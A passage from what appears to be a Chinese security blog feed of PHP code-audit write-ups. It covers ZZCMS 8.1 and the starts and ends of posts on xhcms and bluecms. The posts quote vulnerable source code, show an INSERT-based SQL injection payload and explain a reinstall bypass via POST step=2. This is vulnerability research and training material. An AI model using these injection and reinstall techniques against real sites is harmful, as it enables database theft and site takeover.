<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_14.jpg" alt=""></p>
<p>保存得到报错信息。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xhcms_15.jpg" alt=""></p>
<h3><span id="结语">结语</span></h3><p>其实还是一套简单的CMS，也是常见的漏洞。代码也比较简单，也没有过多的防护。这里找到的一个<code>cookie伪造越权访问</code>漏洞，这种是自动审计工具没法发现的点，所以还是需要自己去读代码的逻辑。结合这个漏洞，就可以在没有后台管理员权限的情况下进行后台的SQL注入。所以结合不同的漏洞去得到一个<code>webshell</code>是需要学习的点。</p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计2-ZZCMS8.1]]></title>
      <url>https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12-ZZCMS8-1.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="前言">前言</span></h3><p>前一篇博客结语中立下的Flag，找了一套内容管理系统ZZCMS8.1。从简单的CMS下手吧。</p>
<h3><span id="zzcms81">ZZCMS8.1</span></h3><h4><span id="后台adminadclassphp注入">后台/admin/adclass.php注入</span></h4><p>在路径<code>/admin/adclass.php</code>有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;Select * from zzcms_adclass where classid=&quot; .$classid.&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;div class=&quot;admintitle&quot;&gt;修改大类&lt;/div&gt;</span><br><span class="line">&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;?dowhat=modifybigclass&quot; onSubmit=&quot;return CheckForm();&quot;&gt;</span><br><span class="line">  &lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot; cellspacing=&quot;0&quot;&gt;</span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td width=&quot;322&quot; align=&quot;right&quot; class=&quot;border&quot;&gt;大类ID：&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt;&lt;?php echo $row[&quot;classid&quot;]?&gt; &lt;input name=&quot;classid&quot; type=&quot;hidden&quot; id=&quot;classid&quot; value=&quot;&lt;?php echo $row[&quot;classid&quot;]?&gt;&quot;&gt;      &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td align=&quot;right&quot; class=&quot;border&quot;&gt;大类名称：&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt; &lt;input name=&quot;classname&quot; type=&quot;text&quot; id=&quot;classname&quot; value=&quot;&lt;?php echo $row[&quot;classname&quot;]?&gt;&quot; size=&quot;60&quot; maxlength=&quot;30&quot;&gt; </span><br><span class="line">        &lt;input name=&quot;oldclassname&quot; type=&quot;hidden&quot; id=&quot;oldclassname&quot; value=&quot;&lt;?php echo $row[&quot;classname&quot;]?&gt;&quot; size=&quot;60&quot; maxlength=&quot;30&quot;&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">   </span><br><span class="line">    &lt;tr&gt; </span><br><span class="line">      &lt;td class=&quot;border&quot;&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">      &lt;td class=&quot;border&quot;&gt; &lt;input name=&quot;action&quot; type=&quot;hidden&quot; id=&quot;action&quot; value=&quot;modify&quot;&gt; </span><br><span class="line">        &lt;input name=&quot;save&quot; type=&quot;submit&quot; id=&quot;save&quot; value=&quot; 修 改 &quot;&gt; &lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br></pre></td></tr></table></figure>
<p>以上代码中的<code>$sql=&quot;Select * from zzcms_adclass where classid=&quot; .$classid.&quot;&quot;;</code>看似是能进行联合查询注入的。找到<code>$classid</code>变量的来源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&apos;classid&apos;]))&#123;</span><br><span class="line">$classid=trim($_REQUEST[&apos;classid&apos;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$classid=&quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$classid</code>仅用<code>trim()</code>函数移除字符串两侧的空白字符 ，虽然对<code>$_GET</code>、<code>$_POST</code>、<code>$REUQEST</code>的变量进行的单引号转义操作，但是这里是不需要逃逸单引号，直接使用联合查询注入。</p>
<p>测试利用常见的<code>union</code>型注入手注。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_1.jpg" alt=""></p>
<p>查询结果直接用<code>echo</code>显示到<code>html</code>。</p>
<p>PHPstorm下断点进行调试</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_2.jpg" alt=""></p>
<h4><span id="后台adminaboutphp注入">后台/admin/about.php注入</span></h4><h5><span id="insert-注入">INSERT 注入</span></h5><p>在路径<code>/admin/about.php</code>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ($action==&quot;savedata&quot; )&#123;</span><br><span class="line">checkadminisdo(&quot;bottomlink&quot;);</span><br><span class="line">	$saveas=trim($_REQUEST[&quot;saveas&quot;]);</span><br><span class="line">	$title=trim($_POST[&quot;title&quot;]);</span><br><span class="line">	$content=stripfxg(rtrim($_POST[&quot;info_content&quot;]));</span><br><span class="line">	$link=trim($_POST[&quot;link&quot;]);</span><br><span class="line">	if ($saveas==&quot;add&quot;)&#123;</span><br><span class="line">	query(&quot;insert into zzcms_about (title,content)VALUES(&apos;$title&apos;,&apos;$content&apos;) &quot;);</span><br><span class="line">	$go=1;</span><br><span class="line">	//echo &quot;&lt;script&gt;location.href=&apos;about_manage.php&apos;&lt;//script&gt;&quot;;	</span><br><span class="line">	&#125;elseif ($saveas==&quot;modify&quot;)&#123;</span><br><span class="line">	query(&quot;update zzcms_about set title=&apos;$title&apos;,content=&apos;$content&apos;,link=&apos;$link&apos; where id=&quot;. $_POST[&apos;id&apos;].&quot; &quot;);</span><br><span class="line">	$go=1;</span><br><span class="line">	//echo &quot;&lt;script&gt;location.href=&apos;about_manage.php&apos;&lt;//script&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码中有两处SQL语句操作，<code>query(&quot;insert into zzcms_about (title,content)VALUES(&#39;$title&#39;,&#39;$content&#39;) &quot;);</code> 这里是用的<code>insert</code>语句，和我上次看的那套bluecms的注入是相似的，主要是闭合构造<code>payload</code>。</p>
<p><code>$title</code>和<code>$content</code>做了一定的处理，<code>$title</code>用<code>trim()</code>函数移除字符串两侧的空白字符，<code>$content</code>用到了一个<code>stripfxg()</code>函数。找到这个函数的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function stripfxg($string) &#123;//去反斜杠 </span><br><span class="line">$string=stripslashes($string);//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了</span><br><span class="line">$string=htmlspecialchars_decode($string);//转html实体符号</span><br><span class="line">return $string; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据函数的注释，该函数的功能是用来去除反斜杠和转html实体符号的。</p>
<p>这里不能利用到<code>$title</code>来进行插入<code>payload</code>，因为全局的单引号转义，但是可以利用<code>$content</code>这个变量，它传入值的单引号被加斜杠转移了，但是有被<code>stripfxg()</code>函数把单引号去除了。所以可以利用这个变量插入<code>payload</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_3.jpg" alt=""></p>
<p>以以上方式插入<code>payload</code>，<code>PHPStrom</code>跟进调试。<code>$content</code>的内容先转义单引号后再被函数除去反斜杠导致可以利用到</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_4.jpg" alt=""></p>
<p>之后传入上面代码说到的<code>insert</code>操作语句<code>query(&quot;insert into zzcms_about (title,content)VALUES(&#39;$title&#39;,&#39;$content&#39;) &quot;);</code>。</p>
<p>构造成如下语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into zzcms_about (title,content)VALUES(&apos;$title&apos;,&apos;1),((select version()),&apos;1&apos;)</span><br></pre></td></tr></table></figure>
<p>注入成功。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_5.jpg" alt=""></p>
<h5><span id="union注入">union注入</span></h5><p>同样在路径<code>/admin/about.php</code>如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($action==&quot;modify&quot;) &#123;</span><br><span class="line">$sql=&quot;select * from zzcms_about where id=&quot;.$_REQUEST[&quot;id&quot;].&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>$sql=&quot;select * from zzcms_about where id=&quot;.$_REQUEST[&quot;id&quot;].&quot;&quot;;</code>这个SQL操作语句也没有做任何过滤，可以直接进行联合查询注入。注入结果输出到<code>html</code>显示。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_6.jpg" alt=""></p>
<p>成功注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_7.jpg" alt=""></p>
<h4><span id="后台adminhelp_managephp注入">后台/admin/help_manage.php注入</span></h4><h4><span id="union注入">union注入</span></h4><p>在路径<code>/admin/help_manage.php</code>文件中有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from zzcms_help where classid=&quot;.$b.&quot; &quot;;</span><br><span class="line">if ($keyword&lt;&gt;&quot;&quot;) &#123;  		</span><br><span class="line">$sql=$sql.&quot; and  title like &apos;%&quot;.$keyword.&quot;%&apos; &quot;;</span><br><span class="line">&#125;</span><br><span class="line">$rs = query($sql,$conn); </span><br><span class="line">$totlenum= num_rows($rs);  </span><br><span class="line">$totlepage=ceil($totlenum/$page_size);</span><br><span class="line"></span><br><span class="line">$sql=$sql . &quot; order by id desc limit $offset,$page_size&quot;;</span><br><span class="line">$rs = query($sql,$conn);</span><br></pre></td></tr></table></figure>
<p><code>$sql=&quot;select * from zzcms_help where classid=&quot;.$b.&quot; &quot;;</code>这个SQL语句操作可以利用，找到变量<code>$b</code>的来源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$b=isset($_REQUEST[&quot;b&quot;])?$_REQUEST[&quot;b&quot;]:&apos;&apos;;</span><br></pre></td></tr></table></figure>
<p>变量没有经过处理，可以直接利用。只是一个简单冒号判断式。</p>
<p><code>$sql=$sql . &quot; order by id desc limit $offset,$page_size&quot;;</code>这个拼接可以利用<code>#</code>注释掉，然后通过<code>while($row = fetch_array($rs))</code>输出到<code>html</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_8.jpg" alt=""></p>
<p>返回注入结果</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_9.jpg" alt=""></p>
<h4><span id="后台adminjobclassmanagephp注入">后台/admin/jobclassmanage.php注入</span></h4><h5><span id="union注入">union注入</span></h5><p>和前面找到的注入是一样的，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;Select * from zzcms_jobclass where classid=&quot; .$classid.&quot;&quot;;</span><br><span class="line">$rs=query($sql);</span><br><span class="line">$row=fetch_array($rs);</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_10.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_11.jpg" alt=""></p>
<h4><span id="installindexphp重装漏洞">/install/index.php重装漏洞</span></h4><p>在路径<code>/install/index.php</code>中有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">switch($step) &#123;</span><br><span class="line">	case &apos;1&apos;://协议</span><br><span class="line">		include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">	break;</span><br><span class="line">	case &apos;2&apos;://环境</span><br><span class="line">		$pass = true;</span><br><span class="line">		$PHP_VERSION = PHP_VERSION;</span><br><span class="line">		if(version_compare($PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) &#123;</span><br><span class="line">			$php_pass = $pass = false;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$php_pass = true;</span><br><span class="line">		&#125;</span><br><span class="line">		$PHP_MYSQL = &apos;&apos;;</span><br><span class="line">		if(extension_loaded(&apos;mysql&apos;)) &#123;</span><br><span class="line">			$PHP_MYSQL = &apos;支持&apos;;</span><br><span class="line">			$mysql_pass = true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$PHP_MYSQL = &apos;不支持&apos;;</span><br><span class="line">			$mysql_pass = $pass = false;</span><br><span class="line">		&#125;</span><br><span class="line">        $PHP_GD = &apos;&apos;;</span><br><span class="line">        if(function_exists(&apos;imagejpeg&apos;)) $PHP_GD .= &apos;jpg&apos;;</span><br><span class="line">        if(function_exists(&apos;imagegif&apos;)) $PHP_GD .= &apos; gif&apos;;</span><br><span class="line">        if(function_exists(&apos;imagepng&apos;)) $PHP_GD .= &apos; png&apos;;</span><br><span class="line">		if($PHP_GD) &#123;</span><br><span class="line">			$gd_pass = true;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$gd_pass = false;</span><br><span class="line">		&#125;</span><br><span class="line">		$PHP_URL = @get_cfg_var(&quot;allow_url_fopen&quot;);//是否支持远程URL，采集有用</span><br><span class="line">		$url_pass = $PHP_URL ? true : false;</span><br><span class="line">		include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">	break;</span><br><span class="line">	case &apos;3&apos;://查目录属性</span><br><span class="line">		include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">	break;</span><br><span class="line">	case &apos;4&apos;://建数据库</span><br><span class="line">		include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">	break;</span><br><span class="line">	case &apos;5&apos;://安装进度</span><br><span class="line">		function dexit($msg) &#123;</span><br><span class="line">			echo &apos;&lt;script&gt;alert(&quot;&apos;.$msg.&apos;&quot;);window.history.back();&lt;/script&gt;&apos;;</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码是用了一个<code>switch-case</code>来进行一个安装的过程。回溯到<code>step</code>变量的来源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$step = isset($_POST[&apos;step&apos;]) ? $_POST[&apos;step&apos;] : 1;</span><br></pre></td></tr></table></figure>
<p>一个冒号运算符，这里可以用<code>POST</code>方式提交一个<code>step</code>值。</p>
<p>跟进<code>switch-case</code>语句的执行。<code>case &#39;1&#39;:</code>进入<code>\install\step_1.php</code>中，在该文件中的开头有验证<code>/install/install.lock 文件</code>的过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(file_exists(&quot;install.lock&quot;))&#123;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding:30px;&apos;&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>继续跟进<code>switch-case</code>语句的执行。在<code>\install\step_2.php</code>中，但是在该文件中并没有验证<code>/install/install.lock 文件</code>的过程。而且在后续的<code>case</code>值里也没有验证。</p>
<p>所以可以直接提交POST数据<code>step=2</code>，跳过验证进行重装。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/zzcms_12.jpg" alt=""></p>
<h3><span id="结语">结语</span></h3><p>这套源码还是相当于简单一点，前台的SQL注入都是做了过滤的。但是在后台的数字型的SQL注入都是没有做过滤的。同时后台也对单引号进行了转义操作，在文章提到的<code>insert</code>注入是因为CMS先对单引号进行的转义操作，后来又把反斜杠给除去了。所以可以利用<code>insert</code>注入。后台的注入相较于来还是比较鸡肋的。</p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[代码审计初体验-bluecms_v1.6_sp1]]></title>
      <url>https://uknowsec.cn/posts/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E4%BD%93%E9%AA%8C-bluecms-v1-6-sp1.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="前言">前言</span></h3><p>一些想做一些代码审计的内容，之前只有做过简单的PHP代码段的审计，没有尝试过整站的代码审计的工作。所以一切重新开始，从最简单的开始。找一些比较老和简单的CMS进行代码审计的训练，熟悉流程，熟悉用PHP调试的方法跟进。</p>
<h3><span id="bluecms_v16_sp1">Bluecms_v1.6_sp1</span></h3><h4><span id="sql注入一">SQL注入一</span></h4><p>在<code>/uploads/uc_client</code>路径下中可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">if(empty($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Error!&apos;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br></pre></td></tr></table></figure>
<p>这里可以看到<code>ad_id</code>传入一个ID值，判断该值是否为空。在代入自定义的函数<code>getone()</code></p>
<p>查找函数<code>getone()</code>到路径<code>\uploads\include\mysql.class.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getone($sql, $type=MYSQL_ASSOC)&#123;</span><br><span class="line">	$query = $this-&gt;query($sql,$this-&gt;linkid);</span><br><span class="line">	$row = mysql_fetch_array($query, $type);</span><br><span class="line">	return $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里封装成了简单的SQL查询函数，函数的第二个参数指定数组类型，<code>MYSQL_ASSOC</code>是关联数组。</p>
<p><code>PhpStorm</code>调试跟进，跟进到了<code>\uploads\include\common.fun.php</code> 这个一个公共函数的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function table($table)</span><br><span class="line">&#123;</span><br><span class="line">	global $pre;</span><br><span class="line">	return  $pre .$table ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>$pre</code>的一个全局变量，在<code>uploads\data\config.php</code>定义的值为<code>blue_</code>即安装文件时的表面前缀。</p>
<p>所以<code>$table</code>函数返回的是一个表名<code>blue_ad</code>。</p>
<p>进一步跟进就到了<code>getone()</code>函数进行SQL语句的查询，再进入一个<code>time_set</code>判断过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if($ad[&apos;time_set&apos;] == 0)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	if($ad[&apos;end_time&apos;] &lt; time())</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[&apos;exp_content&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再做个替换进行输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ad_content = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$ad_content);</span><br><span class="line">$ad_content = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$ad_content);</span><br><span class="line">echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure>
<p>传入<code>Payload</code>利用<code>PHPstorm</code>调试进行跟进测试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms1.jpg" alt=""></p>
<p><code>$ad_id</code>直接代入<code>$sql</code>进行SQL查询。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms2.jpg" alt=""></p>
<p>继续跟进返回查询结果，注入成功返回admin用户的<code>username:password</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms3.jpg" alt=""></p>
<h4><span id="sql注入二">SQL注入二</span></h4><p>在<code>\uploads\include\common.fun.php</code>文件中有<code>getip()</code>函数，该函数是用来获取用户IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">	if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_CLIENT_IP&apos;); </span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) </span><br><span class="line">	&#123; //获取客户端用代理服务器访问时的真实ip 地址</span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); </span><br><span class="line">	&#125;</span><br><span class="line">	elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">	&#125;</span><br><span class="line">	return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>getenv</code>函数用来获取一个环境变量的值。获取到的<code>$ip</code>值没有进行任务校验。</p>
<p>全局搜索<code>getip()</code>函数，<code>\uploads\comment.php</code>文件有用到这个函数。而且还涉及到了SQL语言操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;&quot;.getip().&quot;&apos;, &apos;$is_check&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>SQL注入就是要在已有的SQL查询语句上进行拼接，可以利用拼接的点就是<code>&quot;.getip().&quot;</code>这个点，首先要知道的是在SQL语句中的<code>INSERT INTO</code>来插入内容是可以一次插入多条数据的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; insert into user (id,username,password) value (&apos;1&apos;,&apos;a&apos;,&apos;a&apos;),(&apos;2&apos;,&apos;b&apos;,&apos;b&apos;);</span><br><span class="line">Query OK, 2 rows affected (0.00 sec)</span><br><span class="line">Records: 2  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| Id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | a        | a        |</span><br><span class="line">|  2 | b        | b        |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
